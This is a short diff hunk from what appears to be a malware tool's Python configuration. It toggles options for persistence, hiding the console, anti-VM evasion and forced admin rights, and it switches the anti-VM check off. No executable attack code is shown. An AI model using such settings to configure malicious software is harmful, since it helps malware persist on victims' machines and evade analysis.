@@ -13,7 +13,7 @@ config = {
     'persist': True,
     'keep-alive': False,  
     'hideconsole': True, 
-    'antivm': True,  
+    'antivm': False,  
     'force_admin': False, 
     'black_screen': False, 
     'error': False, 
